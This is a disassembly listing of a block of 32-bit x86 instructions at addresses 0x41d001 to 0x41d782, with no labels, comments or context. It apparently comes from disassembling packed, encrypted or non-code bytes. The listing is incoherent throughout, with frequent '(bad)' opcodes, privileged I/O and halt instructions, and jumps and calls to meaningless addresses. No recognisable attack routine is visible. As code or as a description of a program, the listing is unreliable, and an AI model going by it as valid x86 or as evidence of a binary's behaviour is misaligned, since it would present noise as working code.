  41d001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d002:	iret   
  41d003:	jge    0x41d07b
  41d005:	add    cl,BYTE PTR [esi+edx*2]
  41d008:	out    0x83,al
  41d00a:	inc    esp
  41d00b:	mov    ds:0x6dba90fb,al
  41d010:	inc    esi
  41d011:	mov    ebp,0xc7f959e5
  41d016:	xchg   BYTE PTR [esi],bl
  41d018:	jle    0x41cfa8
  41d01a:	mov    edx,0x78dfc8ef
  41d01f:	hlt    
  41d020:	xchg   DWORD PTR [eax+0x7d],edx
  41d023:	adc    ch,BYTE PTR [edx+0xa]
  41d026:	out    dx,eax
  41d027:	(bad)  
  41d029:	sub    eax,0xda69246f
  41d02e:	jg     0x41d038
  41d030:	inc    edx
  41d031:	mov    eax,ds:0x5512f73f
  41d036:	pop    ss
  41d037:	addr16 dec esp
  41d039:	mov    dl,0xd3
  41d03b:	xchg   edi,eax
  41d03c:	add    al,0x31
  41d03e:	(bad)  
  41d03f:	jmp    0x4a0d2891
  41d044:	pop    ss
  41d045:	in     eax,dx
  41d046:	out    0xf9,al
  41d048:	(bad)  
  41d049:	in     eax,dx
  41d04a:	sbb    BYTE PTR [esi+edx*8+0x4f99f2e0],bl
  41d051:	rol    BYTE PTR [edx+0x558725a5],1
  41d057:	push   ebp
  41d058:	hlt    
  41d059:	adc    eax,0xcdba3fe9
  41d05e:	sti    
  41d05f:	jle    0x41d058
  41d061:	mov    ss,WORD PTR [ebx-0x53]
  41d064:	xor    al,ah
  41d066:	test   BYTE PTR [esi+0xe],0x43
  41d06a:	test   cl,ah
  41d06c:	cmp    BYTE PTR [eax-0x362898a],ch
  41d072:	call   0x3a4632e
  41d077:	mov    dh,0xc2
  41d07a:	fsub   DWORD PTR [ecx]
  41d07c:	pop    ecx
  41d07d:	mov    ah,0x93
  41d07f:	ret    0xb099
  41d082:	and    dl,BYTE PTR [ebp-0x46b10b4]
  41d088:	and    eax,DWORD PTR [ebx+0x518f1321]
  41d08e:	loop   0x41d0d3
  41d090:	ins    DWORD PTR es:[edi],dx
  41d091:	pusha  
  41d092:	xchg   ebx,eax
  41d093:	ficomp DWORD PTR cs:[ecx-0x758736f1]
  41d09a:	js     0x41d041
  41d09c:	adc    al,0xdd
  41d09e:	into   
  41d09f:	data16 (bad) 
  41d0a1:	in     eax,dx
  41d0a2:	mov    WORD PTR [ebp+0x70],fs
  41d0a5:	out    dx,eax
  41d0a6:	hlt    
  41d0a7:	iret   
  41d0a8:	push   ebx
  41d0a9:	dec    eax
  41d0aa:	sub    cl,ch
  41d0ac:	xor    eax,eax
  41d0ae:	adc    esp,DWORD PTR ds:0x7ea997d2
  41d0b4:	xlat   BYTE PTR ds:[ebx]
  41d0b5:	stos   BYTE PTR es:[edi],al
  41d0b6:	fisttp QWORD PTR [eax]
  41d0b8:	(bad)  
  41d0b9:	les    edi,FWORD PTR [eax+0x5643cea9]
  41d0bf:	mov    BYTE PTR [ebp-0x5f582ce7],0x7f
  41d0c6:	sar    DWORD PTR [edx],cl
  41d0c8:	lods   al,BYTE PTR ds:[esi]
  41d0c9:	bound  ecx,QWORD PTR [eax-0x67]
  41d0cc:	mul    BYTE PTR ds:0x1419a9b8
  41d0d2:	cmp    bh,bh
  41d0d4:	adc    al,0x8d
  41d0d6:	call   0x52b93f3
  41d0db:	call   0x5a1f6f21
  41d0e0:	dec    esp
  41d0e1:	and    BYTE PTR [eax-0x1a],cl
  41d0e4:	rcl    cl,cl
  41d0e6:	cmp    DWORD PTR [edx],ebx
  41d0e8:	retf   0x7bd2
  41d0eb:	sbb    edi,DWORD PTR [ebp+ebp*1-0x1654a8bf]
  41d0f2:	xlat   BYTE PTR ss:[ebx]
  41d0f4:	mov    ds:0x787bb184,eax
  41d0f9:	push   ds
  41d0fa:	fcmove st,st(0)
  41d0fc:	jnp    0x41d150
  41d0fe:	stc    
  41d0ff:	in     al,0x70
  41d101:	repnz or ch,BYTE PTR [edx+0x15f792e4]
  41d108:	sbb    DWORD PTR [edi+edi*4+0x77],esi
  41d10c:	(bad)  
  41d10d:	repnz ss loope 0x41d168
  41d111:	shl    dh,0x63
  41d114:	test   DWORD PTR [ebx-0x5b],0x679dab71
  41d11b:	jbe    0x41d153
  41d11d:	icebp  
  41d11e:	push   ebx
  41d11f:	or     cl,BYTE PTR [edx+0x13a44b98]
  41d125:	scas   eax,DWORD PTR es:[edi]
  41d126:	add    BYTE PTR [edi],al
  41d128:	pop    es
  41d129:	(bad)  
  41d12a:	cld    
  41d12b:	add    eax,0x6bfc69e9
  41d130:	xor    bh,bl
  41d132:	mov    esi,0xfa030317
  41d137:	cs ret 0x8998
  41d13b:	dec    eax
  41d13c:	out    dx,eax
  41d13d:	mov    ch,0xd3
  41d13f:	fst    DWORD PTR [esi+0x41]
  41d142:	jns    0x41d15f
  41d144:	out    0xba,al
  41d146:	xor    al,0x12
  41d148:	xor    eax,0x84c38d37
  41d14d:	retf   0xfec1
  41d150:	pop    ecx
  41d151:	xchg   edi,eax
  41d152:	push   ecx
  41d153:	clc    
  41d154:	sbb    ah,0x2
  41d157:	loop   0x41d17a
  41d159:	add    BYTE PTR [edi-0x1b392565],bh
  41d15f:	(bad)  
  41d160:	into   
  41d161:	loopne 0x41d1b5
  41d163:	dec    ebx
  41d164:	jle    0x41d0f1
  41d166:	jecxz  0x41d175
  41d168:	xor    dh,BYTE PTR [ebx+ebx*2+0x7720ac2d]
  41d16f:	jne    0x41d171
  41d171:	fsubr  QWORD PTR ds:0x4af81bbf
  41d177:	mov    edx,0x687b6a9b
  41d17c:	hlt    
  41d17d:	cld    
  41d17e:	(bad)  
  41d17f:	in     al,dx
  41d180:	pop    edx
  41d181:	or     eax,0x473fd360
  41d186:	pop    eax
  41d187:	test   al,0x89
  41d189:	dec    edi
  41d18a:	bound  ecx,QWORD PTR [eax+0x371fa26c]
  41d190:	repz sub al,0xf4
  41d193:	jns    0x41d17a
  41d195:	jp     0x41d11f
  41d197:	adc    BYTE PTR [eax],0x5b
  41d19a:	sub    BYTE PTR [edi+0x1b],dl
  41d19d:	push   DWORD PTR [ebx-0x440f278b]
  41d1a3:	jmp    0x41d19e
  41d1a5:	mov    ah,0xbe
  41d1a7:	ins    BYTE PTR es:[edi],dx
  41d1a8:	lea    edx,ds:0x806bad09
  41d1ae:	(bad)  
  41d1af:	lods   al,BYTE PTR ds:[esi]
  41d1b0:	std    
  41d1b1:	pusha  
  41d1b2:	jge    0x41d17b
  41d1b4:	cmp    ch,BYTE PTR [eax+0x68]
  41d1b7:	call   0xa64c818a
  41d1bc:	dec    edi
  41d1bd:	lahf   
  41d1be:	mov    eax,ds:0xe9e35580
  41d1c3:	test   dl,dh
  41d1c5:	mov    bl,0x10
  41d1c7:	int3   
  41d1c8:	int3   
  41d1c9:	sub    eax,0x5ea95796
  41d1ce:	xchg   esp,eax
  41d1cf:	push   cs
  41d1d0:	dec    eax
  41d1d1:	mov    ch,0xa0
  41d1d3:	sub    edx,DWORD PTR [ecx+0x6b]
  41d1d6:	add    DWORD PTR [edx-0x4e],ebp
  41d1d9:	in     al,0x47
  41d1db:	sub    al,0x5
  41d1dd:	and    eax,0xcf42b57e
  41d1e2:	xchg   edx,eax
  41d1e3:	sub    al,0xc4
  41d1e5:	rol    BYTE PTR [edx+ecx*4+0x561cc8bd],cl
  41d1ec:	sbb    al,0x5b
  41d1ee:	sub    al,BYTE PTR ds:0x73e555d8
  41d1f4:	fisttp QWORD PTR [ebp+0x4e435c00]
  41d1fa:	mov    BYTE PTR [eax-0x67],dl
  41d1fd:	in     eax,0x1
  41d1ff:	jmp    0x3573:0x7064f74f
  41d206:	cwde   
  41d207:	aad    0xdd
  41d209:	mov    edx,0xbb7308a4
  41d20e:	jg     0x41d282
  41d210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d211:	fld    DWORD PTR [ecx+0x66b4401b]
  41d217:	das    
  41d218:	jle    0x41d1d8
  41d21a:	loop   0x41d26b
  41d21c:	jns    0x41d238
  41d21e:	xor    eax,0x2d1a9bb6
  41d223:	push   esp
  41d224:	repz ret 0x267c
  41d228:	test   ebp,eax
  41d22a:	jge    0x41d23f
  41d22c:	in     al,dx
  41d22d:	mov    edi,0xc8503352
  41d232:	fmul   QWORD PTR ds:0xaa902459
  41d238:	int3   
  41d239:	aad    0x3c
  41d23b:	xor    DWORD PTR [ebp-0x7878f166],ecx
  41d241:	retf   0xce8c
  41d244:	gs sahf 
  41d246:	fwait
  41d247:	or     dh,BYTE PTR [ecx]
  41d249:	cmp    BYTE PTR [esi],al
  41d24b:	jp     0x41d29e
  41d24d:	or     dh,BYTE PTR [edi]
  41d24f:	mov    DWORD PTR [eax+edi*8-0x6b4d16c5],ebp
  41d256:	in     al,0x2b
  41d258:	xchg   edx,eax
  41d259:	mov    ?,WORD PTR [eax-0x5b]
  41d25c:	das    
  41d25d:	out    0xae,eax
  41d25f:	cmp    al,0xb2
  41d261:	push   edx
  41d262:	adc    cl,BYTE PTR [ecx+0x4]
  41d265:	sbb    al,0xbe
  41d267:	sbb    DWORD PTR [eax],esi
  41d269:	and    bl,BYTE PTR [ecx+0x50]
  41d26c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d26d:	push   es
  41d26e:	or     al,0x65
  41d270:	mov    edi,0x49e8956e
  41d275:	mov    ch,BYTE PTR [esi+0x71197406]
  41d27b:	sub    BYTE PTR [ebx+ebx*4+0x8],bh
  41d27f:	jmp    0xa9007940
  41d284:	mov    dl,0xe1
  41d286:	lds    ebp,FWORD PTR [edi]
  41d288:	jns    0x41d2d7
  41d28a:	mov    esi,0x5fb01abc
  41d28f:	cmp    ch,BYTE PTR [ecx+0x5d398a6]
  41d295:	inc    ebx
  41d296:	pop    ss
  41d297:	sub    dl,BYTE PTR [edx]
  41d299:	in     eax,0x5e
  41d29b:	jnp    0x41d2e6
  41d29d:	xlat   BYTE PTR ds:[ebx]
  41d29e:	xchg   DWORD PTR [ebx+0x3dac7692],edx
  41d2a4:	push   es
  41d2a5:	xor    DWORD PTR [edi],ebx
  41d2a7:	js     0x41d2c2
  41d2a9:	aam    0xd7
  41d2ab:	xchg   edi,eax
  41d2ac:	scas   eax,DWORD PTR es:[edi]
  41d2ad:	pop    esi
  41d2ae:	mov    ch,0x71
  41d2b0:	xor    BYTE PTR [esi],dl
  41d2b2:	in     al,dx
  41d2b3:	test   al,0x1b
  41d2b5:	mov    cl,0xc3
  41d2b7:	dec    ecx
  41d2b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2b9:	repnz (bad) 
  41d2bb:	fcomp  st(7)
  41d2bd:	and    BYTE PTR [edx+eiz*4-0x5d8b05f9],0x6f
  41d2c5:	mov    bl,0x56
  41d2c7:	mov    al,0xc4
  41d2c9:	cmp    BYTE PTR [ebp+0x76],0xd4
  41d2cd:	into   
  41d2ce:	cld    
  41d2cf:	push   ebx
  41d2d0:	xor    eax,0x3079cdc5
  41d2d5:	or     al,BYTE PTR [edi+0x66dac148]
  41d2db:	pop    ebx
  41d2dc:	mov    edx,esp
  41d2de:	sahf   
  41d2df:	and    eax,0xa62e422
  41d2e4:	outs   dx,BYTE PTR ds:[esi]
  41d2e5:	xchg   edi,eax
  41d2e6:	push   ss
  41d2e7:	(bad)  
  41d2e8:	jne    0x41d275
  41d2ea:	bound  esi,QWORD PTR [ebx-0x1c851307]
  41d2f0:	mov    ss,edi
  41d2f2:	repz jmp 0x41d306
  41d2f5:	jno    0x41d2f1
  41d2f7:	mov    edi,ebp
  41d2f9:	lahf   
  41d2fa:	scas   eax,DWORD PTR es:[edi]
  41d2fb:	inc    esp
  41d2fc:	enter  0x959f,0x36
  41d300:	pop    ebp
  41d301:	lock adc ecx,DWORD PTR [ebp-0x75]
  41d305:	not    BYTE PTR [edi+0x29]
  41d308:	repz into 
  41d30a:	gs jne 0x41d33a
  41d30d:	ss dec ebp
  41d30f:	es or  al,0x9d
  41d312:	push   esi
  41d313:	jecxz  0x41d372
  41d315:	adc    ah,BYTE PTR [edx+0xb]
  41d318:	fs mov eax,0xfb46a9b
  41d31e:	cs xor eax,ebp
  41d321:	push   esp
  41d322:	(bad)  
  41d324:	dec    ecx
  41d325:	mov    BYTE PTR [eax+0x582dbe23],ah
  41d32b:	outs   dx,DWORD PTR ds:[esi]
  41d32c:	cmp    BYTE PTR [edx*4+0x787d8fb8],0xa
  41d334:	push   es
  41d335:	or     eax,DWORD PTR [ecx+ebx*8-0x7cef6d9d]
  41d33c:	jmp    0x41d335
  41d33e:	and    DWORD PTR [ebx-0x38db8b95],ebx
  41d344:	int3   
  41d345:	gs sti 
  41d347:	pop    ebp
  41d348:	sahf   
  41d349:	add    al,dh
  41d34b:	ja     0x41d3ae
  41d34d:	lock adc DWORD PTR [edi],esp
  41d350:	and    ah,bl
  41d352:	cmp    ebp,DWORD PTR [ecx+0x3ebabfc3]
  41d358:	call   0xf054:0xcff5521
  41d35f:	imul   esi,ebp,0x9635a62e
  41d365:	dec    esi
  41d366:	jmp    0x41d36e
  41d368:	dec    edx
  41d369:	cmc    
  41d36a:	imul   edx,DWORD PTR [ecx],0x47999a7
  41d370:	xor    eax,0x1defaf2d
  41d375:	push   ebx
  41d376:	fucom  st(6)
  41d378:	(bad)  
  41d379:	mul    DWORD PTR [eax+edi*2]
  41d37c:	pop    ds
  41d37d:	ins    BYTE PTR es:[edi],dx
  41d37e:	adc    DWORD PTR [edx],0x50
  41d381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d382:	adc    al,0xf6
  41d384:	xchg   ecx,eax
  41d385:	pop    ds
  41d386:	nop
  41d387:	and    ch,BYTE PTR [ecx+0x2a76cfa9]
  41d38d:	pop    ebx
  41d38e:	sti    
  41d38f:	lea    ebp,[eax+0x44]
  41d392:	jg     0x41d33c
  41d394:	cmp    eax,DWORD PTR [esi-0x66]
  41d397:	mov    ss,WORD PTR [ebp+ebx*4+0x2b8cd42e]
  41d39e:	retf   0x4ff7
  41d3a1:	cdq    
  41d3a2:	and    dh,BYTE PTR ds:0xc4830cdd
  41d3a8:	shr    ebx,1
  41d3aa:	fwait
  41d3ab:	ret    
  41d3ac:	scas   al,BYTE PTR es:[edi]
  41d3ad:	sub    cl,BYTE PTR [ebx]
  41d3af:	mov    al,0xda
  41d3b1:	and    ch,BYTE PTR [eax+edi*1+0x72]
  41d3b5:	push   ebp
  41d3b6:	ds das 
  41d3b8:	dec    ebx
  41d3b9:	xchg   BYTE PTR [esp+eiz*4],dh
  41d3bc:	pop    ds
  41d3bd:	dec    ebx
  41d3be:	inc    ebp
  41d3bf:	fucomip st,st(4)
  41d3c1:	mov    cl,ch
  41d3c3:	mov    bh,0xa9
  41d3c5:	jne    0x41d3b9
  41d3c7:	xor    eax,0x4128de4f
  41d3cc:	pop    ebx
  41d3cd:	push   ss
  41d3ce:	xor    al,BYTE PTR [eax+0x51a1da54]
  41d3d4:	loop   0x41d43e
  41d3d6:	push   es
  41d3d7:	add    eax,0x8cf7465d
  41d3dc:	inc    esp
  41d3dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3de:	push   ebx
  41d3df:	leave  
  41d3e0:	in     eax,0xc1
  41d3e2:	int3   
  41d3e3:	mov    esp,?
  41d3e5:	mov    ah,0xcd
  41d3e7:	stc    
  41d3e8:	cli    
  41d3e9:	mov    edi,DWORD PTR [esi+0xfe76087]
  41d3ef:	int    0x7
  41d3f1:	icebp  
  41d3f2:	enter  0xe72e,0x8c
  41d3f6:	retf   
  41d3f7:	in     eax,0x73
  41d3f9:	fbld   TBYTE PTR ds:0xbeddf0f5
  41d3ff:	xchg   ebx,eax
  41d400:	or     al,0xe2
  41d402:	das    
  41d403:	stos   BYTE PTR es:[edi],al
  41d404:	cmp    eax,0xce66fd8
  41d409:	ins    BYTE PTR es:[edi],dx
  41d40a:	sti    
  41d40b:	or     al,0x4e
  41d40d:	sub    eax,0x507d98fd
  41d412:	mov    DWORD PTR [esi-0x38],esp
  41d415:	lock fwait
  41d417:	pop    ebx
  41d418:	sub    ebp,edx
  41d41a:	cmp    al,0x91
  41d41c:	and    ch,ch
  41d41e:	aam    0xd0
  41d420:	mov    eax,ds:0x1bb2b072
  41d425:	mov    esp,0x575f16f1
  41d42a:	out    dx,al
  41d42b:	and    BYTE PTR [esi+0x4b],bl
  41d42e:	stc    
  41d42f:	aad    0xb6
  41d431:	and    eax,0x100d3c9b
  41d436:	(bad)  
  41d438:	shr    ebx,cl
  41d43a:	retf   0x63d3
  41d43d:	add    cl,bl
  41d43f:	(bad)  
  41d440:	lahf   
  41d441:	or     al,0x94
  41d443:	pop    ebp
  41d444:	sub    ah,BYTE PTR [ecx-0x50]
  41d447:	and    BYTE PTR [esi+0x6f],ah
  41d44a:	rol    BYTE PTR [esi],1
  41d44c:	stc    
  41d44d:	mov    al,ds:0xa25b1c8e
  41d452:	jle    0x41d45a
  41d454:	inc    esi
  41d455:	lods   eax,DWORD PTR ds:[esi]
  41d456:	jp     0x41d473
  41d458:	xor    BYTE PTR [ebx],0x9a
  41d45b:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41d45d:	rcl    DWORD PTR [eax+0x22a0bbed],cl
  41d463:	pop    ecx
  41d464:	inc    esi
  41d465:	cmp    eax,0x7e9fa0c4
  41d46a:	pusha  
  41d46b:	imul   ebp,DWORD PTR [esi],0x8899bcf0
  41d471:	nop
  41d472:	or     bl,BYTE PTR [ebp+0x1ecb5dec]
  41d478:	sub    eax,0xb40948f9
  41d47d:	neg    BYTE PTR [esi+0x4a]
  41d480:	add    DWORD PTR [edx],0x8488fe67
  41d486:	xchg   esi,eax
  41d487:	xchg   DWORD PTR [edi-0x3686a177],edi
  41d48d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d48e:	xor    dl,BYTE PTR [esi-0x4a]
  41d491:	mov    bl,0x66
  41d493:	ja     0x41d4ed
  41d495:	outs   dx,DWORD PTR ds:[esi]
  41d496:	mov    ebp,esi
  41d498:	dec    edi
  41d499:	mov    dl,0x4d
  41d49b:	xor    eax,0x12b8a68e
  41d4a0:	push   esi
  41d4a1:	jp     0x41d4b6
  41d4a3:	pop    ebp
  41d4a4:	pop    ebx
  41d4a5:	js     0x41d4b6
  41d4a7:	xor    al,al
  41d4a9:	fwait
  41d4aa:	sub    DWORD PTR [edi+0x65],0xbfadc529
  41d4b1:	add    DWORD PTR [esi+eiz*2-0x3c436a8],edx
  41d4b8:	xor    dh,bl
  41d4ba:	jle    0x41d4da
  41d4bc:	xor    dl,dl
  41d4be:	add    eax,0xf5a83c65
  41d4c3:	mov    WORD PTR [eax-0xa],ds
  41d4c6:	xchg   ecx,eax
  41d4c7:	mov    ecx,0x6e33ba99
  41d4cc:	mov    edi,0x6b577985
  41d4d1:	inc    eax
  41d4d2:	lock jg 0x41d4ec
  41d4d5:	dec    esp
  41d4d6:	mov    esp,0xa843c167
  41d4db:	xchg   edx,eax
  41d4dc:	rcr    BYTE PTR [esi+0x1dcc494e],cl
  41d4e2:	mov    ah,0xf4
  41d4e4:	sub    ebp,DWORD PTR ds:0x2afe594a
  41d4ea:	int3   
  41d4eb:	mov    fs,WORD PTR [eax-0x28329d4d]
  41d4f1:	push   0x5e52fd6b
  41d4f6:	adc    BYTE PTR [edi-0x64],dl
  41d4f9:	mov    dh,0x9b
  41d4fb:	mov    ?,WORD PTR [ebp-0x16f94ccd]
  41d501:	icebp  
  41d502:	stos   BYTE PTR es:[edi],al
  41d503:	mov    bl,0x33
  41d505:	push   0x43
  41d507:	inc    esi
  41d508:	popf   
  41d509:	ja     0x41d57d
  41d50b:	xchg   esp,eax
  41d50c:	nop
  41d50d:	in     eax,dx
  41d50e:	or     eax,0xd337c2ed
  41d513:	pop    esp
  41d514:	daa    
  41d515:	dec    edx
  41d516:	pop    esi
  41d517:	repnz xchg ebp,eax
  41d519:	jbe    0x41d528
  41d51b:	int    0x8b
  41d51d:	jo     0x41d50b
  41d51f:	inc    eax
  41d520:	mov    ds:0x3959bfc7,eax
  41d525:	dec    edi
  41d526:	ja     0x41d54a
  41d528:	push   es
  41d529:	iret   
  41d52a:	jae    0x41d4ee
  41d52c:	adc    edx,DWORD PTR [esi-0x77]
  41d52f:	or     DWORD PTR [edi-0x6c16c00b],ecx
  41d535:	not    DWORD PTR es:[esi+eiz*2+0x7a]
  41d53a:	sbb    al,0xc9
  41d53c:	sub    al,0x6
  41d53e:	mov    ah,0xb1
  41d540:	and    ah,BYTE PTR [ecx+0x7fd08a92]
  41d546:	enter  0x8d82,0xd4
  41d54a:	sub    edi,DWORD PTR [ebx]
  41d54c:	outs   dx,DWORD PTR ds:[esi]
  41d54d:	xlat   BYTE PTR ss:[ebx]
  41d54f:	(bad)  
  41d550:	xchg   BYTE PTR es:[ebp+ebx*8+0x69703e1c],bl
  41d558:	cmp    BYTE PTR [edx],0xe6
  41d55b:	call   0x4bb9299f
  41d560:	inc    ebp
  41d561:	scas   eax,DWORD PTR es:[edi]
  41d562:	mov    ebp,0x38baf6d2
  41d567:	inc    edi
  41d568:	fst    QWORD PTR [eax-0x4148b7d6]
  41d56e:	aad    0x69
  41d570:	dec    edi
  41d571:	fmul   st,st(2)
  41d573:	ins    DWORD PTR es:[edi],dx
  41d574:	and    al,ah
  41d576:	add    BYTE PTR [ecx+0x26e6ef8d],0x93
  41d57d:	add    al,BYTE PTR [esp+edx*1]
  41d580:	push   0x1e2bbec6
  41d585:	dec    edi
  41d586:	stc    
  41d587:	mov    esi,0x3d5d108c
  41d58c:	jbe    0x41d5ff
  41d58e:	adc    edi,DWORD PTR [ebp+0x45b1fdd8]
  41d594:	sub    al,0x97
  41d596:	popa   
  41d597:	mov    esi,0x57b15550
  41d59c:	cmp    BYTE PTR [ecx+0x27fbb53c],bh
  41d5a2:	pusha  
  41d5a3:	add    DWORD PTR [ebp-0x59e8a21d],0xffffffca
  41d5aa:	mov    eax,0x6374abc5
  41d5af:	fsub   QWORD PTR ds:0x9ef2
  41d5b4:	ins    BYTE PTR es:[edi],dx
  41d5b5:	popf   
  41d5b6:	xor    DWORD PTR [esi+0x20578c9],ecx
  41d5bc:	mov    ah,0x83
  41d5be:	inc    ebp
  41d5bf:	adc    dl,BYTE PTR [ecx+0x8]
  41d5c2:	js     0x41d549
  41d5c4:	inc    ecx
  41d5c5:	mov    bh,0xe6
  41d5c7:	sbb    ebp,ebp
  41d5c9:	popf   
  41d5ca:	cld    
  41d5cb:	outs   dx,DWORD PTR ds:[esi]
  41d5cc:	daa    
  41d5cd:	dec    eax
  41d5ce:	rcl    DWORD PTR [ebx+ebx*2-0x83eb76b],0x37
  41d5d6:	sbb    DWORD PTR [edi+0x3c],0xf65e0249
  41d5dd:	cmp    bh,BYTE PTR [esi+0x753bc1b6]
  41d5e3:	imul   ebx,DWORD PTR [eax+0x3e],0x7
  41d5e7:	xlat   BYTE PTR ds:[ebx]
  41d5e8:	es push ds
  41d5ea:	fsub   QWORD PTR [ebx-0x348c2ac8]
  41d5f0:	jp     0x41d59b
  41d5f2:	(bad)  
  41d5f3:	outs   dx,DWORD PTR ds:[esi]
  41d5f4:	int    0xe7
  41d5f6:	or     bl,BYTE PTR [ebx-0x64]
  41d5f9:	sbb    edx,eax
  41d5fb:	test   ebp,ebx
  41d5fd:	ud2    
  41d5ff:	test   BYTE PTR [ebp-0x5d212896],al
  41d605:	pop    edx
  41d606:	pop    edx
  41d607:	inc    ecx
  41d608:	pop    bx
  41d60a:	data16 aad 0x29
  41d60d:	div    BYTE PTR ds:0xd6336334
  41d613:	jecxz  0x41d627
  41d615:	std    
  41d616:	stc    
  41d617:	push   edx
  41d618:	mov    esp,DWORD PTR [ecx]
  41d61a:	bound  esp,QWORD PTR [edi+0x3a718465]
  41d620:	push   esi
  41d621:	pop    es
  41d622:	mov    WORD PTR [ebx+0x2ee5850],gs
  41d628:	out    0x49,eax
  41d62a:	push   ebp
  41d62b:	jecxz  0x41d5bb
  41d62d:	dec    ecx
  41d62e:	mov    edx,0xbb0fd97a
  41d633:	(bad)  
  41d634:	jg     0x41d6b4
  41d636:	neg    BYTE PTR [edx+0x2a]
  41d639:	xor    esp,eax
  41d63b:	(bad)  
  41d63c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d63d:	bound  ebx,QWORD PTR [edx+0x46]
  41d640:	(bad)  
  41d641:	sub    cl,BYTE PTR [ebx]
  41d643:	jg     0x41d5ed
  41d645:	dec    esp
  41d646:	jno    0x41d641
  41d648:	mov    ebp,0xa8edaccb
  41d64d:	cli    
  41d64e:	aad    0xbc
  41d650:	and    al,ah
  41d652:	aad    0x80
  41d654:	push   0xf0376ff9
  41d659:	lods   al,BYTE PTR ds:[esi]
  41d65a:	add    edi,ebx
  41d65c:	cmp    dh,ah
  41d65e:	mov    eax,ds:0x5e0e4b26
  41d663:	int    0xe2
  41d665:	push   esp
  41d666:	xor    DWORD PTR [edx-0x33c4a043],esi
  41d66c:	xor    BYTE PTR [ebx+0x15],0xaf
  41d670:	lahf   
  41d671:	dec    esp
  41d672:	popf   
  41d673:	jo     0x41d6cd
  41d675:	in     eax,dx
  41d676:	je     0x41d612
  41d678:	xchg   esp,eax
  41d679:	push   es
  41d67a:	sbb    BYTE PTR [ebp+0x72bdd2e0],0xdc
  41d681:	(bad)  
  41d682:	cli    
  41d683:	outs   dx,DWORD PTR ds:[esi]
  41d684:	pop    ebx
  41d685:	jp     0x41d61e
  41d687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d688:	loop   0x41d691
  41d68a:	cmp    DWORD PTR [ebx+0xfc783f9],esi
  41d690:	in     al,dx
  41d691:	scas   eax,DWORD PTR es:[edi]
  41d692:	dec    edx
  41d693:	je     0x41d686
  41d695:	sbb    ecx,0x71
  41d698:	sbb    ecx,ebx
  41d69a:	imul   esp,DWORD PTR [ecx-0x44583d5d],0xffffffb7
  41d6a1:	neg    BYTE PTR [eax+ebp*4+0x1678d679]
  41d6a8:	ja     0x41d725
  41d6aa:	push   cs
  41d6ab:	inc    edx
  41d6ac:	jge    0x41d709
  41d6ae:	sahf   
  41d6af:	sbb    BYTE PTR [ebp+0x5d8ca760],bl
  41d6b5:	cmp    al,0x32
  41d6b7:	xchg   edx,eax
  41d6b8:	or     eax,0x910e591f
  41d6bd:	in     eax,0x3f
  41d6bf:	mov    dl,0xfc
  41d6c1:	pop    ds
  41d6c2:	push   cs
  41d6c3:	neg    DWORD PTR [ecx]
  41d6c5:	jae    0x41d6ab
  41d6c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6c8:	ins    DWORD PTR es:[edi],dx
  41d6c9:	xor    BYTE PTR [eax],ah
  41d6cb:	or     DWORD PTR [ecx+0xb],esp
  41d6ce:	pop    ebp
  41d6cf:	add    BYTE PTR [ebx-0x76],dl
  41d6d2:	dec    ebx
  41d6d3:	stc    
  41d6d4:	cld    
  41d6d5:	aad    0x32
  41d6d7:	out    0x1f,al
  41d6d9:	or     eax,0x779cf13f
  41d6de:	outs   dx,BYTE PTR ds:[esi]
  41d6df:	fwait
  41d6e0:	neg    DWORD PTR [edx]
  41d6e2:	dec    eax
  41d6e3:	cmp    cl,BYTE PTR [eax+0x7a2668c9]
  41d6e9:	leave  
  41d6ea:	dec    DWORD PTR [ebp+eiz*1+0x15]
  41d6ee:	xchg   BYTE PTR [ebx+0x27],ch
  41d6f1:	std    
  41d6f2:	pop    ecx
  41d6f3:	data16 (bad) 
  41d6f5:	(bad)  
  41d6f7:	out    dx,al
  41d6f8:	mov    eax,ds:0x38abd823
  41d6fd:	loop   0x41d700
  41d6ff:	std    
  41d700:	outs   dx,DWORD PTR ds:[esi]
  41d701:	xchg   edx,eax
  41d702:	cwde   
  41d703:	jge    0x41d6d5
  41d705:	cmp    DWORD PTR [esi+0x19],esp
  41d708:	cld    
  41d709:	xchg   BYTE PTR [eax+0x398a0106],dl
  41d70f:	cwde   
  41d710:	mov    edi,0x19e06da3
  41d715:	mov    ebp,0xfdebb43f
  41d71a:	and    DWORD PTR [ebp-0x6e],edx
  41d71d:	cmp    BYTE PTR [esi-0x1a],dl
  41d720:	cdq    
  41d721:	je     0x41d6c1
  41d723:	mov    bl,0x2
  41d725:	aaa    
  41d726:	or     dl,0x9
  41d729:	cmp    ebp,esi
  41d72b:	std    
  41d72c:	jne    0x41d76e
  41d72e:	mov    ds:0x707adff3,al
  41d733:	neg    BYTE PTR [ebx]
  41d735:	imul   ebp,DWORD PTR [di],0x959438d7
  41d73c:	jb     0x41d7b0
  41d73e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d740:	clc    
  41d741:	add    bl,dh
  41d743:	add    edi,DWORD PTR [ebx+0x11f4cf07]
  41d749:	les    edx,FWORD PTR [ecx+ebx*1+0x9]
  41d74d:	jae    0x41d6fd
  41d74f:	xchg   esp,eax
  41d750:	pusha  
  41d751:	push   ebx
  41d752:	out    0x3,al
  41d754:	xchg   esp,eax
  41d755:	test   al,0xff
  41d757:	mov    ?,WORD PTR [edx]
  41d759:	ins    BYTE PTR es:[edi],dx
  41d75a:	xchg   esp,eax
  41d75b:	outs   dx,DWORD PTR ds:[esi]
  41d75c:	add    al,0x51
  41d75e:	sar    BYTE PTR [ebx+0x4a4c760d],cl
  41d764:	jns    0x41d763
  41d766:	cmp    ecx,DWORD PTR ds:0x1eca7db5
  41d76c:	jmp    0x1b27000b
  41d771:	jl     0x41d722
  41d773:	sbb    DWORD PTR [ecx-0x51],ebp
  41d776:	int    0x5f
  41d778:	cmp    esi,0xbd2d5c6e
  41d77e:	repz out dx,eax
  41d780:	jo     0x41d79d
  41d782:	jo     0x41d775
